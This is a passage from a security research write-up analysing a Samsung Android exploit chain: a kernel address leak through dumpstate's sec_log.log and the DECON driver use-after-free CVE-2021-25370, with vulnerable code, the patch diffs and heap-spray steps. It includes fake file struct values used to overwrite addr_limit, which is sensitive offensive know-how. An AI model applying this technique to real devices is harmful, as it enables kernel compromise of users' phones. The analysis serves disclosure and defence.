The bugreport service in dumpstate.rc is a Samsung-specific customization. The [AOSP version of dumpstate.rc](https://cs.android.com/android/platform/superproject/+/master:frameworks/native/cmds/dumpstate/dumpstate.rc;l=1?q=dumpstate.rc&sq=&ss=android%2Fplatform%2Fsuperproject) doesn’t include this service.

The Samsung version of the dumpstate (/system/bin/dumpstate) binary then copies everything from /proc/sec_log to /data/log/sec_log.log as shown in the pseudo-code below. This is the first few lines of the dumpstate() function within the dumpstate binary. The dump_sec_log (symbols included within the binary) function copies everything from the path provided in argument two to the path provided in argument three.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">&nbsp; _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));</p><p dir="ltr">&nbsp;&nbsp;LOBYTE(s) = 18;</p><p dir="ltr">&nbsp;&nbsp;v650[0] = 0LL;</p><p dir="ltr">&nbsp;&nbsp;s_8 = 17664LL;</p><p dir="ltr">&nbsp;&nbsp;*(char **)((char *)&amp;s + 1) = *(char **)"DUMPSTATE";</p><p dir="ltr">&nbsp;&nbsp;DurationReporter::DurationReporter(v636, (__int64)&amp;s, 0);</p><p dir="ltr">&nbsp;&nbsp;if ( ((unsigned __int8)s &amp; 1) != 0 )</p><p dir="ltr">&nbsp;&nbsp;&nbsp;&nbsp;operator delete(v650[0]);</p><p dir="ltr">&nbsp;&nbsp;dump_sec_log("SEC LOG", "/proc/sec_log", "/data/log/sec_log.log");</p></td></tr></tbody></table>

After starting the bugreport service, the exploit uses [inotify](https://man7.org/linux/man-pages/man7/inotify.7.html) to monitor for IN_CLOSE_WRITE events in the /data/log/ directory. IN_CLOSE_WRITE triggers when a file that was opened for writing is closed. So this watch will occur when dumpstate is finished writing to sec_log.log.

An example of the sec_log.log file contents generated after hitting the WARN_ON statement is shown below. The exploit combs through the file contents looking for two values on the stack that are at address *b60 and *bc0: the task_struct and the sys_call_table address.

<table><colgroup><col width="677"></colgroup><tbody><tr><td><p dir="ltr">&lt;4&gt;[90808.635627]&nbsp; [4:&nbsp; &nbsp; poc:25943] ------------[ cut here ]------------</p><p dir="ltr">&lt;4&gt;[90808.635654]&nbsp; [4:&nbsp; &nbsp; poc:25943] WARNING: CPU: 4 PID: 25943 at drivers/gpu/arm/b_r19p0/mali_kbase_vinstr.c:992 kbasep_vinstr_hwcnt_reader_ioctl+0x36c/0x664</p><p dir="ltr">&lt;4&gt;[90808.635663]&nbsp; [4:&nbsp; &nbsp; poc:25943] Modules linked in:</p><p dir="ltr">&lt;4&gt;[90808.635675]&nbsp; [4:&nbsp; &nbsp; poc:25943] CPU: 4 PID: 25943 Comm: poc Tainted: G&nbsp; &nbsp; &nbsp; &nbsp; W &nbsp; &nbsp; &nbsp; 4.14.113-20034833 #1</p><p dir="ltr">&lt;4&gt;[90808.635682]&nbsp; [4:&nbsp; &nbsp; poc:25943] Hardware name: Samsung BEYOND1LTE EUR OPEN 26 board based on EXYNOS9820 (DT)</p><p dir="ltr">&lt;4&gt;[90808.635689]&nbsp; [4:&nbsp; &nbsp; poc:25943] Call trace:</p><p dir="ltr">&lt;4&gt;[90808.635701]&nbsp; [4:&nbsp; &nbsp; poc:25943] [&lt;0000000000000000&gt;] dump_backtrace+0x0/0x280</p><p dir="ltr">&lt;4&gt;[90808.635710]&nbsp; [4:&nbsp; &nbsp; poc:25943] [&lt;0000000000000000&gt;] show_stack+0x18/0x24</p><p dir="ltr">&lt;4&gt;[90808.635720]&nbsp; [4:&nbsp; &nbsp; poc:25943] [&lt;0000000000000000&gt;] dump_stack+0xa8/0xe4</p><p dir="ltr">&lt;4&gt;[90808.635731]&nbsp; [4:&nbsp; &nbsp; poc:25943] [&lt;0000000000000000&gt;] __warn+0xbc/0x164tv</p><p dir="ltr">&lt;4&gt;[90808.635738]&nbsp; [4:&nbsp; &nbsp; poc:25943] [&lt;0000000000000000&gt;] report_bug+0x15c/0x19c</p><p dir="ltr">&lt;4&gt;[90808.635746]&nbsp; [4:&nbsp; &nbsp; poc:25943] [&lt;0000000000000000&gt;] bug_handler+0x30/0x8c</p><p dir="ltr">&lt;4&gt;[90808.635753]&nbsp; [4:&nbsp; &nbsp; poc:25943] [&lt;0000000000000000&gt;] brk_handler+0x94/0x150</p><p dir="ltr">&lt;4&gt;[90808.635760]&nbsp; [4:&nbsp; &nbsp; poc:25943] [&lt;0000000000000000&gt;] do_debug_exception+0xc8/0x164</p><p dir="ltr">&lt;4&gt;[90808.635766]&nbsp; [4:&nbsp; &nbsp; poc:25943] Exception stack(0xffffff8014c2bb40 to 0xffffff8014c2bc80)</p><p dir="ltr">&lt;4&gt;[90808.635775]&nbsp; [4:&nbsp; &nbsp; poc:25943] bb40: ffffffc91b00fa40 000000004004befe 0000000000000000 0000000000000000</p><p dir="ltr">&lt;4&gt;[90808.635781]&nbsp; [4:&nbsp; &nbsp; poc:25943] bb60: ffffffc061b65800 000000000ecc0408 000000000000000a 000000000000000a</p><p dir="ltr">&lt;4&gt;[90808.635789]&nbsp; [4:&nbsp; &nbsp; poc:25943] bb80: 000000004004be30 000000000000be00 ffffffc86b49d700 000000000000000b</p><p dir="ltr">&lt;4&gt;[90808.635796]&nbsp; [4:&nbsp; &nbsp; poc:25943] bba0: ffffff8014c2bdd0 0000000080000000 0000000000000026 0000000000000026</p><p dir="ltr">&lt;4&gt;[90808.635802]&nbsp; [4:&nbsp; &nbsp; poc:25943] bbc0: ffffff8008429834 000000000041bd50 0000000000000000 0000000000000000</p><p dir="ltr">&lt;4&gt;[90808.635809]&nbsp; [4:&nbsp; &nbsp; poc:25943] bbe0: ffffffc88b42d500 ffffffffffffffea ffffffc96bda5bc0 0000000000000004</p><p dir="ltr">&lt;4&gt;[90808.635816]&nbsp; [4:&nbsp; &nbsp; poc:25943] bc00: 0000000000000000 0000000000000124 000000000000001d ffffff8009293000</p><p dir="ltr">&lt;4&gt;[90808.635823]&nbsp; [4:&nbsp; &nbsp; poc:25943] bc20: ffffffc89bb6b180 ffffff8014c2bdf0 ffffff80084294bc ffffff8014c2bd80</p><p dir="ltr">&lt;4&gt;[90808.635829]&nbsp; [4:&nbsp; &nbsp; poc:25943] bc40: ffffff800885014c 0000000020400145 0000000000000008 0000000000000008</p><p dir="ltr">&lt;4&gt;[90808.635836]&nbsp; [4:&nbsp; &nbsp; poc:25943] bc60: 0000007fffffffff 0000000000000001 ffffff8014c2bdf0 ffffff800885014c</p><p dir="ltr">&lt;4&gt;[90808.635843]&nbsp; [4:&nbsp; &nbsp; poc:25943] [&lt;0000000000000000&gt;] el1_dbg+0x18/0x74</p></td></tr></tbody></table>

The file /data/log/sec_log.log has the SELinux context dumplog_data_file which is widely accessible to many apps as shown below. The exploit is currently running within the SamsungTTS app which is the system_app SELinux context. While the exploit does not have access to /dev/kmsg due to SELinux access controls, it can access the same contents when they are copied to the sec_log.log which has more permissive access.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">$ sesearch -A -t dumplog_data_file -c file -p open precompiled_sepolicy | grep _app</p><p dir="ltr">allow aasa_service_app dumplog_data_file:file { getattr ioctl lock map open read };</p><p dir="ltr">allow dualdar_app dumplog_data_file:file { append create getattr ioctl lock map open read rename setattr unlink write };</p><p dir="ltr">allow platform_app dumplog_data_file:file { append create getattr ioctl lock map open read rename setattr unlink write };</p><p dir="ltr">allow priv_app dumplog_data_file:file { append create getattr ioctl lock map open read rename setattr unlink write };</p><p dir="ltr">allow system_app dumplog_data_file:file { append create getattr ioctl lock map open read rename setattr unlink write };</p><p dir="ltr">allow teed_app dumplog_data_file:file { append create getattr ioctl lock map open read rename setattr unlink write };</p><p dir="ltr">allow vzwfiltered_untrusted_app dumplog_data_file:file { getattr ioctl lock map open read };</p></td></tr></tbody></table>

Fixing the vulnerability
------------------------

There were a few different changes to address this vulnerability:

*   Modified the dumpstate binary on the device – As of the March 2021 update, dumpstate no longer writes to /data/log/sec_log.log.
    
*   Removed the bugreport service from dumpstate.rc.
    

In addition there were a few changes made earlier in 2020 that when included would prevent this vulnerability in the future:

*   As mentioned above, in February 2020 ARM had released version r21p0 of the Mali driver which had replaced the WARN_ON with the more appropriate pr_warn which does not log a full backtrace. The March 2021 Samsung firmware included updating from version r19p0 of the Mali driver to r26p0 which used pr_warn instead of WARN_ON.
    
*   In April 2020, [upstream Linux made a change](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/arch/arm64/kernel/traps.c?h=linux-4.14.y&id=6dc0256f802be6bc783fb9542affb48d267f592c) to no longer include raw stack contents in kernel backtraces.
    

The final vulnerability in the chain (CVE-2021-25370) is a use-after-free of a file struct in the Display and Enhancement Controller (DECON) Samsung driver for the Display Processing Unit (DPU). According to the [upstream commit message](https://patchwork.kernel.org/project/dri-devel/patch/1417097460-18403-1-git-send-email-ajaykumar.rs@samsung.com/), DECON is responsible for creating the video signals from pixel data. This vulnerability is used to gain arbitrary kernel read and write access. 

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDPl73oa-7g4YO-V5owrIWmBkxynQqdOD4lgWyubSEx7dg2BoS502R_3o4QZjFfP3gjwoEVNv7__hYBltjZuj5aIq22wdDPg8klVTrahHcwp-TxgHoOkeIerXdOUh2igwrLtPYFBlDqEJdaccmMuV88suhYn9v07QfM3b2NlHZ0zNCux84B4RojB-U/w640-h108/image1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDPl73oa-7g4YO-V5owrIWmBkxynQqdOD4lgWyubSEx7dg2BoS502R_3o4QZjFfP3gjwoEVNv7__hYBltjZuj5aIq22wdDPg8klVTrahHcwp-TxgHoOkeIerXdOUh2igwrLtPYFBlDqEJdaccmMuV88suhYn9v07QfM3b2NlHZ0zNCux84B4RojB-U/s1213/image1.png)

Find the PID of android.hardware.graphics.composer

To be able to trigger the vulnerability the exploit needs an fd for the driver in order to send ioctl calls. To find the fd, the exploit has to to iterate through the fd proc directory for the target process. Therefore the exploit first needs to find the PID for the graphics process. 

The exploit connects to [LogReader which listens at](https://cs.android.com/android/platform/superproject/+/586af4e17de6b8bf665dc2a1bb61f46fddb326f7:system/logging/logd/main.cpp;l=256) /dev/socket/logdr. When a client connects to LogReader, LogReader writes the log contents back to the client. The exploit then configures LogReader to send it logs for the main log buffer (0), system log buffer (3), and the crash log buffer (4) by writing back to LogReader via the socket:

The exploit then monitors the log contents until it sees the words ‘display’ or ‘SDM’. Once it finds a ‘display’ or ‘SDM’ log entry, the exploit then reads the PID from that log entry.

Now it has the PID of android.hardware.graphics.composer, where [android.hardware.graphics composer is the Hardware Composer HAL](https://source.android.com/docs/core/graphics/hwc).

Next the exploit needs to find the full file path for the DECON driver. The full file path can exist in a few different places on the filesystem so to find which one it is on this device, the exploit iterates through the /proc/<PID>/fd/ directory looking for any file path that contains “graphics/fb0”, the DECON driver. It uses readlink to find the file path for each /proc/<PID>/fd/<fd>. The semclipboard vulnerability (vulnerability #1) is then used to get the raw file descriptor for the DECON driver path. 

Triggering the Use-After-Free
-----------------------------

The vulnerability is in the decon_set_win_config function in the Samsung DECON driver. The vulnerability is a relatively common use-after-free pattern in kernel drivers. First, the driver acquires an fd for a fence. This fd is associated with a file pointer in a sync_file struct, specifically the file member. A “[fence](https://www.kernel.org/doc/html/latest/driver-api/sync_file.html)” is used for sharing buffers and synchronizing access between drivers and different processes. 

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">/**</p><p dir="ltr">&nbsp;* struct sync_file - sync file to export to the userspace</p><p dir="ltr">&nbsp;* @file: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; file representing this fence</p><p dir="ltr">&nbsp;* @sync_file_list: &nbsp; &nbsp; membership in global file list</p><p dir="ltr">&nbsp;* @wq: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait queue for fence signaling</p><p dir="ltr">&nbsp;* @fence: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;fence with the fences in the sync_file</p><p dir="ltr">&nbsp;* @cb: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fence callback information</p><p dir="ltr">&nbsp;*/</p><p dir="ltr">struct sync_file {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; struct file &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *file;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; /**</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* @user_name:</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Name of the sync file provided by userspace, for merged fences.</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Otherwise generated through driver callbacks (in which case the</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* entire array is 0).</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; char &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;user_name[32];</p><p dir="ltr">#ifdef CONFIG_DEBUG_FS</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; struct list_head &nbsp; &nbsp; &nbsp; &nbsp;sync_file_list;</p><p dir="ltr">#endif</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; wait_queue_head_t &nbsp; &nbsp; &nbsp; wq;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; unsigned long &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; flags;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; struct dma_fence &nbsp; &nbsp; &nbsp; &nbsp;*fence;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; struct dma_fence_cb cb;</p><p dir="ltr">};</p></td></tr></tbody></table>

The driver then calls fd_install on the fd and file pointer, which makes the fd accessible from userspace and transfers ownership of the reference to the fd table. Userspace is able to call close on that fd. If that fd holds the only reference to the file struct, then the file struct is freed. However, the driver continues to use the pointer to that freed file struct.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">static int decon_set_win_config(struct decon_device *decon,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; struct decon_win_config_data *win_data)</p><p dir="ltr">{</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; int num_of_window = 0;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; struct decon_reg_data *regs;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; struct sync_file *sync_file;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; int i, j, ret = 0;</p><p dir="ltr">[...]</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; num_of_window = decon_get_active_win_count(decon, win_data);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (num_of_window) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; win_data-&gt;retire_fence = decon_create_fence(decon, &amp;sync_file);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (win_data-&gt;retire_fence &lt; 0)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto err_prepare;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; } else {</p><p dir="ltr">[...]</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (num_of_window) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fd_install(win_data-&gt;retire_fence, sync_file-&gt;file);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decon_create_release_fences(decon, win_data, sync_file);</p><p dir="ltr">#if !defined(CONFIG_SUPPORT_LEGACY_FENCE)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; regs-&gt;retire_fence = dma_fence_get(sync_file-&gt;fence);</p><p dir="ltr">#endif</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">[...]</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; return ret;</p><p dir="ltr">}</p></td></tr></tbody></table>

In this case, decon_set_win_config acquires the fd for retire_fence in decon_create_fence.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">int decon_create_fence(struct decon_device *decon, struct sync_file **sync_file)</p><p dir="ltr">{</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; struct dma_fence *fence;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; int fd = -EMFILE;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; fence = kzalloc(sizeof(*fence), GFP_KERNEL);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (!fence)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -ENOMEM;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; dma_fence_init(fence, &amp;decon_fence_ops, &amp;decon-&gt;fence.lock,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;decon-&gt;fence.context,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;atomic_inc_return(&amp;decon-&gt;fence.timeline));</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; *sync_file = sync_file_create(fence);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; dma_fence_put(fence);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (!(*sync_file)) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decon_err("%s: failed to create sync file\n", __func__);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return -ENOMEM;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; fd = decon_get_valid_fd();</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (fd &lt; 0) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decon_err("%s: failed to get unused fd\n", __func__);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fput((*sync_file)-&gt;file);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; return fd;</p><p dir="ltr">}</p></td></tr></tbody></table>

The function then calls fd_install(win_data->retire_fence, sync_file->file) which means that userspace can now access the fd. When fd_install is called, another reference is not taken on the file so when userspace calls close(fd), the only reference on the file is dropped and the file struct is freed. The issue is that after calling fd_install the function then calls decon_create_release_fences(decon, win_data, sync_file) with the same sync_file that contains the pointer to the freed file struct. 

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">void decon_create_release_fences(struct decon_device *decon,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; struct decon_win_config_data *win_data,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; struct sync_file *sync_file)</p><p dir="ltr">{</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; int i = 0;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; for (i = 0; i &lt; decon-&gt;dt.max_win; i++) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int state = win_data-&gt;config[i].state;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int rel_fence = -1;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (state == DECON_WIN_STATE_BUFFER) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rel_fence = decon_get_valid_fd();</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (rel_fence &lt; 0) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decon_err("%s: failed to get unused fd\n",</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; __func__);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto err;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fd_install(rel_fence, get_file(sync_file-&gt;file));</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; win_data-&gt;config[i].rel_fence = rel_fence;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; return;</p><p dir="ltr">err:</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; while (i-- &gt; 0) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (win_data-&gt;config[i].state == DECON_WIN_STATE_BUFFER) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; put_unused_fd(win_data-&gt;config[i].rel_fence);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; win_data-&gt;config[i].rel_fence = -1;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; return;</p><p dir="ltr">}</p></td></tr></tbody></table>

decon_create_release_fences gets a new fd, but then associates that new fd with the freed file struct, sync_file->file, in the call to fd_install.

When decon_set_win_config returns, retire_fence is the closed fd that points to the freed file struct and rel_fence is the open fd that points to the freed file struct.

### Fixing the vulnerability

Samsung fixed this use-after-free in March 2021 as CVE-2021-25370. The fix was to move the call to fd_install in decon_set_win_config to the latest possible point in the function after the call to decon_create_release_fences.

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (num_of_window) {</p><p dir="ltr">- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fd_install(win_data-&gt;retire_fence, sync_file-&gt;file);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decon_create_release_fences(decon, win_data, sync_file);</p><p dir="ltr">#if !defined(CONFIG_SUPPORT_LEGACY_FENCE)</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; regs-&gt;retire_fence = dma_fence_get(sync_file-&gt;fence);</p><p dir="ltr">#endif</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; }</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; decon_hiber_block(decon);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; mutex_lock(&amp;decon-&gt;up.lock);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; list_add_tail(&amp;regs-&gt;list, &amp;decon-&gt;up.list);</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; atomic_inc(&amp;decon-&gt;up.remaining_frame);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; decon-&gt;update_regs_list_cnt++;</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; win_data-&gt;extra.remained_frames = atomic_read(&amp;decon-&gt;up.remaining_frame);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; mutex_unlock(&amp;decon-&gt;up.lock);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; kthread_queue_work(&amp;decon-&gt;up.worker, &amp;decon-&gt;up.work);</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; /*</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; &nbsp;* The code is moved here because the DPU driver may get a wrong fd</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; &nbsp;* through the released file pointer,</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; &nbsp;* if the user(HWC) closes the fd and releases the file pointer.</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; &nbsp;*</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; &nbsp;* Since the user land can use fd from this point/time,</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; &nbsp;* it can be guaranteed to use an unreleased file pointer</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; &nbsp;* when creating a rel_fence in decon_create_release_fences(...)</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; &nbsp;*/</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; if (num_of_window)</p><p dir="ltr">+ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fd_install(win_data-&gt;retire_fence, sync_file-&gt;file);</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; mutex_unlock(&amp;decon-&gt;lock);</p></td></tr></tbody></table>

Heap Grooming and Spray
-----------------------

To groom the heap the exploit first opens and closes 30,000+ files using memfd_create. Then, the exploit sprays the heap with fake file structs. On this version of the Samsung kernel, the file struct is 0x140 bytes. In these new, fake file structs, the exploit sets four of the members:

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">fake_file.f_u = 0x1010101;</p><p dir="ltr">fake_file.f_op = kaddr - 0x2071B0+0x1094E80;</p><p dir="ltr">fake_file.f_count = 0x7F;</p><p dir="ltr">fake_file.private_data = addr_limit_ptr;</p></td></tr></tbody></table>

The f_op member is set to the signalfd_op for reasons we will cover below in the “Overwriting the addr_limit” section. kaddr is the address leaked using vulnerability #2 described previously. The addr_limit_ptr was calculated by adding 8 to the task_struct address also leaked using vulnerability #2.

The exploit sprays 25 of these structs across the heap using the MEM_PROFILE_ADD ioctl in the Mali driver. 

<table><colgroup></colgroup><tbody><tr><td><p dir="ltr">/**</p><p dir="ltr">&nbsp;* struct kbase_ioctl_mem_profile_add - Provide profiling information to kernel</p><p dir="ltr">&nbsp;* @buffer: Pointer to the information</p><p dir="ltr">&nbsp;* @len: Length</p><p dir="ltr">&nbsp;* @padding: Padding</p><p dir="ltr">&nbsp;*</p><p dir="ltr">&nbsp;* The data provided is accessible through a debugfs file</p><p dir="ltr">&nbsp;*/</p><p dir="ltr">struct kbase_ioctl_mem_profile_add {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; __u64 buffer;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; __u32 len;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; __u32 padding;</p><p dir="ltr">};</p><p dir="ltr">#define KBASE_ioctl_MEM_PROFILE_ADD \</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; _IOW(KBASE_ioctl_TYPE, 27, struct kbase_ioctl_mem_profile_add)</p><p dir="ltr">static int kbase_api_mem_profile_add(struct kbase_context *kctx,</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; struct kbase_ioctl_mem_profile_add *data)</p><p dir="ltr">{</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; char *buf;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; int err;</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; if (data-&gt;len &gt; KBASE_MEM_PROFILE_MAX_BUF_SIZE) {</p><p dir="ltr">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dev_err(kctx-&gt;kbdev-&gt;dev, 